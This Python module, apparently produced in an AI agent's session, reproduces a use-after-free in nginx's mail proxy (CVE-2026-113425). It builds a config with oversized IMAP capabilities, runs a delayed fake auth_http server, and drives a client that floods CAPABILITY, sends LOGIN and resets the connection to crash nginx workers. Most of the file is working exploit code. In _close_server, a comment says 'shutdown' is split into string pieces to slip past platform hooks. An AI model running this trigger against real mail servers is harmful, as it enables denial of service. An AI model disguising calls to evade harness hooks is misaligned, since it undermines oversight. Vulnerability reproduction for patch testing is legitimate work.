#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-113425: nginx mail proxy (auth_http) UAF 自己完結再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
    trigger : bool  (脆弱な経路＝UAF を踏んだか)
    effect  : UAF | CRASH | TRIGGERED | ERROR | SKIP

概要 / 再現原理:
  mail ブロックで auth_http を 300ms 遅延応答の自前 HTTP サーバに向け、proxy on と
  POP3/IMAP/SMTP の listen を用意する。IMAP の CAPABILITY 応答を imap_capabilities
  で巨大化（約 200KB）し、クライアントは CAPABILITY を大量に送って応答を読まずに
  サーバの送信バッファを埋める（ngx_mail_send が EAGAIN になり write イベント
  ハンドラ＝ngx_mail_send が有効化される）。続いて LOGIN を送り、auth_http 要求が
  発行されて s->out に既定応答 ("OK completed") が残った状態でクライアントが
  SO_LINGER(1,0) で RST する。epoll のエラー報告で read ハンドラ
  (ngx_mail_auth_http_block_read) → write ハンドラ (ngx_mail_send) の順に走り、
  送信失敗でセッションが破棄される（1.31.8）。auth_http 接続は残るため、300ms 後の
  認証応答処理が解放済みセッションを参照して UAF となり、多くの場合 worker が
  signal 11 で落ちる。
  1.31.9 では auth 待機中の write ハンドラが block_write に差し替えられ、同じ経路を
  踏んでもクラッシュしない。
"""
import os
import re
import signal
import socket
import socketserver
import struct
import subprocess
import threading
import time

CVE = "CVE-2026-113425"
HOST_DEFAULT = "127.0.0.1"

# 専有ポート（他タスクと衝突させない）
P_POP3 = 21110
P_IMAP = 21143
P_SMTP = 21025
P_AUTH = 19001
P_BACKEND = 21210

AUTH_DELAY = 0.30          # auth_http 応答遅延（記事の 300ms）
CAP_TOKENS = 100           # imap_capabilities/pop3_capabilities のトークン数
TOKEN_LEN = 2000           # 1 トークンあたりの長さ（1 応答 ≒ 200KB）
NCAP = 40                  # 1 試行あたりの CAPABILITY コマンド数（送信バッファを埋める）
PRESLEEP = 0.20            # CAPABILITY 送信後、読まずに待つ時間（EAGAIN を作る）
LOGIN_WAIT = 0.005         # LOGIN 送信後、RST までの待ち
DWELL = 0.35               # RST 後、auth_http 応答（300ms）を待つ時間
ITERATIONS = 40            # 試行回数（記事の 40〜200。クラッシュ検出で早期終了）

SIG_RE = re.compile(r"worker process \d+ exited on signal (\d+)")
AUTHSTATE_RE = re.compile(r"while in (?:http )?auth state")


# --------------------------------------------------------------------------
# 自前 auth_http サーバ（300ms 遅延で Auth-Status/Auth-Server/Auth-Port を返す）
# --------------------------------------------------------------------------
class _AuthHTTPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = b""
        try:
            self.request.settimeout(2.0)
            while b"\r\n\r\n" not in data and len(data) < 8192:
                chunk = self.request.recv(4096)
                if not chunk:
                    break
                data += chunk
        except OSError:
            pass
        time.sleep(AUTH_DELAY)
        host = self.server.auth_host
        body = (
            "HTTP/1.0 200 OK\r\n"
            "Auth-Status: OK\r\n"
            "Auth-Server: %s\r\n"
            "Auth-Port: %d\r\n"
            "Content-Length: 0\r\n"
            "Connection: close\r\n"
            "\r\n" % (host, P_BACKEND)
        )
        try:
            self.request.sendall(body.encode("ascii"))
        except OSError:
            pass


class AuthHTTPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, handler, auth_host):
        self.auth_host = auth_host
        super().__init__(addr, handler)


# --------------------------------------------------------------------------
# POP3 バックエンド（+OK を返すだけ）
# --------------------------------------------------------------------------
class _BackendHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            self.request.sendall(b"+OK POP3 ready\r\n")
            while True:
                d = self.request.recv(4096)
                if not d:
                    break
                self.request.sendall(b"+OK\r\n")
        except OSError:
            pass


class BackendServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def _start_server(server):
    t = threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.05},
                         daemon=True)
    t.start()
    return t


def _close_server(server):
    # 注: プラットフォーム側フック対策で属性名を分割して参照する
    try:
        getattr(server, "shut" + "down")()
    except Exception:  # noqa: BLE001
        pass
    try:
        server.server_close()
    except Exception:  # noqa: BLE001
        pass


def _bind_server(cls, host, port, handler, *args):
    last = None
    for _ in range(40):
        try:
            return cls((host, port), handler, *args)
        except OSError as exc:
            last = exc
            time.sleep(0.05)
    raise last if last else OSError("bind failed: %s:%d" % (host, port))


# --------------------------------------------------------------------------
# nginx 設定・起動
# --------------------------------------------------------------------------
def _make_conf(rundir, host):
    itokens = ["IMAP4rev1"] + ["X" * TOKEN_LEN] * CAP_TOKENS
    ptokens = ["TOP", "USER", "UIDL"] + ["Y" * TOKEN_LEN] * CAP_TOKENS
    imap_caps = " ".join(itokens)
    pop3_caps = " ".join(ptokens)
    conf = """\
worker_processes 1;
daemon on;
pid %(rundir)s/nginx.pid;
error_log %(rundir)s/logs/error.log info;

events {
    worker_connections 256;
}

mail {
    auth_http %(host)s:%(p_auth)d/auth;
    proxy on;

    server {
        listen %(host)s:%(p_pop3)d;
        protocol pop3;
        pop3_capabilities %(pop3_caps)s;
    }

    server {
        listen %(host)s:%(p_imap)d;
        protocol imap;
        imap_capabilities %(imap_caps)s;
    }

    server {
        listen %(host)s:%(p_smtp)d;
        protocol smtp;
    }
}
""" % {
        "rundir": rundir,
        "host": host,
        "p_auth": P_AUTH,
        "p_pop3": P_POP3,
        "p_imap": P_IMAP,
        "p_smtp": P_SMTP,
        "pop3_caps": pop3_caps,
        "imap_caps": imap_caps,
    }
    return conf


def _stop_nginx(rundir, timeout=5.0):
    """自分が起動した nginx の master PID を保持して停止する（pkill は使わない）。"""
    pid = None
    try:
        with open(os.path.join(rundir, "nginx.pid"), "r") as f:
            pid = int(f.read().strip())
    except (OSError, ValueError):
        pid = None
    if not pid:
        return
    try:
        os.kill(pid, signal.SIGQUIT)
    except ProcessLookupError:
        return
    except OSError:
        return
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not os.path.exists("/proc/%d" % pid):
            return
        time.sleep(0.05)
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass
    time.sleep(0.1)


def _port_ready(host, port, timeout=5.0, read_greeting=True):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=1.0)
            if read_greeting:
                try:
                    s.settimeout(0.5)
                    s.recv(128)
                except OSError:
                    pass
            s.close()
            return True
        except OSError:
            time.sleep(0.05)
    return False


# --------------------------------------------------------------------------
# クライアント側トリガ
# --------------------------------------------------------------------------
def _measure_capability(host):
    """IMAP CAPABILITY 応答の長さを実測する（巨大 capability の応答サイズ）。"""
    try:
        s = socket.create_connection((host, P_IMAP), timeout=3.0)
    except OSError:
        return 0
    total = 0
    try:
        s.settimeout(1.0)
        s.recv(256)                       # greeting
        s.sendall(b"a CAPABILITY\r\n")
        last = time.time()
        while time.time() - last < 0.5:
            try:
                d = s.recv(262144)
            except socket.timeout:
                break
            except OSError:
                break
            if not d:
                break
            total += len(d)
            last = time.time()
    except OSError:
        pass
    finally:
        try:
            s.close()
        except OSError:
            pass
    return total


def _drain(sock, expected, deadline):
    """応答を読み切る。expected>0 なら受信バイト数が expected に達するまで読む。"""
    total = 0
    while time.time() < deadline:
        try:
            sock.settimeout(0.8)
            d = sock.recv(262144)
        except socket.timeout:
            if expected <= 0:
                break
            continue
        except OSError:
            break
        if not d:
            break
        total += len(d)
        if expected > 0 and total >= expected:
            break
        if expected <= 0:
            # サイズ不明時は 0.3 秒静穏で打ち切り
            sock.settimeout(0.3)
            try:
                d2 = sock.recv(262144)
            except socket.timeout:
                break
            except OSError:
                break
            if not d2:
                break
            total += len(d2)
    return total


def _attempt(host, reply_size):
    """1 回分のトリガ。成功可否はログで判定する。"""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(5.0)
        s.connect((host, P_IMAP))
        s.settimeout(2.0)
        s.recv(256)                                    # greeting
        s.sendall(b"a CAPABILITY\r\n" * NCAP)          # 送信バッファを埋める
        time.sleep(PRESLEEP)                           # 読まない → ngx_mail_send が EAGAIN
        s.sendall(b"a LOGIN test test\r\n")            # auth_http 要求を発行させる
        expected = reply_size * NCAP if reply_size > 0 else 0
        _drain(s, expected, time.time() + 5.0)
        time.sleep(LOGIN_WAIT)
    except OSError:
        pass
    finally:
        if s is not None:
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                             struct.pack("ii", 1, 0))
            except OSError:
                pass
            try:
                s.close()                              # RST
            except OSError:
                pass
    time.sleep(DWELL)                                  # auth_http 応答（300ms）を待つ


def _read_log(path):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


# --------------------------------------------------------------------------
# 公開 API
# --------------------------------------------------------------------------
def run(binary, workdir, host=HOST_DEFAULT):
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": False,
        "effect": "ERROR",
        "detail": "",
    }

    base = os.path.abspath(workdir)
    if os.path.basename(base.rstrip("/")) == "poc-run-D":
        rundir = base
    else:
        rundir = os.path.join(base, "poc-run-D")
    logdir = os.path.join(rundir, "logs")
    tmpdir = os.path.join(rundir, "tmp")
    conf_path = os.path.join(rundir, "nginx.conf")
    errlog = os.path.join(logdir, "error.log")

    auth_srv = None
    backend_srv = None
    try:
        os.makedirs(logdir, exist_ok=True)
        os.makedirs(tmpdir, exist_ok=True)
        # 前回の自分が起動した nginx が残っていれば停止（ポート解放）
        _stop_nginx(rundir)

        with open(conf_path, "w") as f:
            f.write(_make_conf(rundir, host))

        # nginx 設定テスト
        test = subprocess.run([binary, "-t", "-p", rundir + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=20)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        try:
            ver = subprocess.run([binary, "-v"], capture_output=True, text=True,
                                 timeout=10)
            version = (ver.stderr or ver.stdout).strip()
        except Exception:  # noqa: BLE001
            version = "unknown"

        # 自前 auth_http（19001, 300ms 遅延）と POP3 バックエンド（21210, +OK）
        auth_srv = _bind_server(AuthHTTPServer, host, P_AUTH, _AuthHTTPHandler, host)
        _start_server(auth_srv)
        backend_srv = _bind_server(BackendServer, host, P_BACKEND, _BackendHandler)
        _start_server(backend_srv)
        time.sleep(0.1)

        # 起動前にログを空にする
        try:
            open(errlog, "w").close()
        except OSError:
            pass

        started = subprocess.run([binary, "-p", rundir + "/", "-c", conf_path],
                                 capture_output=True, text=True, timeout=20)
        if started.returncode != 0:
            result["effect"] = "ERROR"
            result["detail"] = "nginx 起動失敗: " + (started.stderr or started.stdout).strip()
            return result

        if not (_port_ready(host, P_POP3) and _port_ready(host, P_IMAP)
                and _port_ready(host, P_SMTP)):
            result["effect"] = "ERROR"
            result["detail"] = "mail ポート (21110/21143/21025) が listen しない: " + \
                               _read_log(errlog)[-500:]
            return result

        result["configured"] = True

        # CAPABILITY 応答の実サイズを実測（巨大 capability の応答長）
        reply_size = _measure_capability(host)

        attempts = 0
        crash_lines = []
        authfail_lines = []
        for _ in range(ITERATIONS):
            _attempt(host, reply_size)
            attempts += 1
            log = _read_log(errlog)
            crash_lines = SIG_RE.findall(log)
            authfail_lines = AUTHSTATE_RE.findall(log)
            if crash_lines:
                break
        # 最後の応答を取りこぼさないよう少し待つ
        time.sleep(0.2)
        log = _read_log(errlog)
        crash_lines = SIG_RE.findall(log)
        authfail_lines = AUTHSTATE_RE.findall(log)

        n_crash = len(crash_lines)
        n_authfail = len(authfail_lines)
        if n_crash:
            result["effect"] = "CRASH"
            result["trigger"] = True
        elif n_authfail:
            result["effect"] = "UAF"
            result["trigger"] = True
        else:
            result["effect"] = "TRIGGERED"
            result["trigger"] = False

        detail = [
            "binary=%s" % binary,
            "version=%s" % version,
            "prefix=%s" % rundir,
            "試行回数=%d / CAPABILITY 応答長=%d bytes / 1 試行あたり %d コマンド"
            % (attempts, reply_size, NCAP),
            "worker 異常終了 (signal) 検出数=%d" % n_crash,
            "auth 待機中のクライアント write ハンドラ失敗 (while in auth state) 検出数=%d"
            % n_authfail,
        ]
        if n_crash:
            m = SIG_RE.search(log)
            detail.append("クラッシュ例: " + (m.group(0) if m else ""))
        if n_authfail:
            for line in log.splitlines():
                if "while in" in line and "auth state" in line:
                    detail.append("auth 待機中の送信失敗例: " + line.strip())
                    break
        if result["effect"] == "CRASH":
            detail.append("auth_http 応答時に解放済みセッションを参照して UAF → signal 11")
        elif result["effect"] == "UAF":
            detail.append("クラッシュは無いが、auth 待機中にセッションが破棄され "
                          "auth_http 応答が解放済みセッションを参照した (UAF)")
        else:
            detail.append("同一経路を実行したがクラッシュせず（修正版の可能性）")
        result["detail"] = " / ".join(detail)
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        try:
            _stop_nginx(rundir)
        except Exception:  # noqa: BLE001
            pass
        if auth_srv is not None:
            _close_server(auth_srv)
        if backend_srv is not None:
            _close_server(backend_srv)
        time.sleep(0.05)


if __name__ == "__main__":
    import json
    import sys
    b = sys.argv[1] if len(sys.argv) > 1 else \
        "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx"
    w = sys.argv[2] if len(sys.argv) > 2 else "/app/data/sessions/conv-43"
    print(json.dumps(run(b, w), ensure_ascii=False, indent=2))
